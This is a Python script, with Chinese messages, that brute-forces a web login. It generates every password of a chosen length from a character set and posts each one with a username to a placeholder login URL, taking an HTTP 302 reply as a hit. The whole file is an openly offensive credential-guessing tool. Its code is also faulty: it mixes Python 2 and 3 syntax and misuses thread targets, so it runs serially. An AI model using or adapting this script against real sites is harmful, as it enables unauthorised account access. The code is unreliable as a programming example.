# coding=utf8

import requests
import sys
import itertools
import queue
import threading
import time


class Bruter():
        def __init__(self, user, characters, pwd_len, threads):
                self.user = user
                self.found = False
                self.threads = threads
                self.characters = characters
                self.threads = threads
                self.pwd_len = pwd_len

        def start_build_queue(self):
                print("'Start Build Queue...'")
                self.pwd_queue = queue.Queue()
                for pwd in list(itertools.product(self.characters, repeat=self.pwd_len)):
                        self.pwd_queue.put(''.join(pwd))
                        self.result = None

                        #print("Build Success!")
                        if self.pwd_queue.qsize()==100:
                                time.sleep(5)

        def brute(self):
                t = threading.Thread(target=self.start_build_queue())
                t.start()

                for i in range(self.threads):
                        t = threading.Thread(target=self.web_bruter())
                        t.start()

                        print("start Thread-->%s start" % t.ident)
                        while (not self.pwd_queue.empty()):
                                sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)' % self.pwd_queue.qsize())
                                sys.stdout.flush()
                                time.sleep(1)
                                print("\nover")

        def login(self, pwd):
                url = 'xx/login/user_login'
                values = {'user_name': self.user, 'password': pwd, 'action': 'login'}
                my_cookie = {'xx': 'xx'}
                r = requests.post(url, data=values, cookies=my_cookie, allow_redirects=False)
                print 'login:', self.user, pwd, r.status_code

                if r.status_code == 302:
                        return True
                return False

        def web_bruter(self):
                while not self.pwd_queue.empty() and not self.found:
                        pwd_test = self.pwd_queue.get()
                        if self.login(pwd_test):
                                self.found = True
                                self.result = pwd_test
                                print("success %s success，pwd: %s" % (self.user, pwd_test))
                        else:
                                self.found = False


if __name__ == '__main__':
        if len(sys.argv) != 5:
                print('用法 : cmd [用户名] [密码字符] [密码长度] [线程数]')
                exit(0)

        print sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
        b = Bruter(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
        b.brute()
        print(b.result)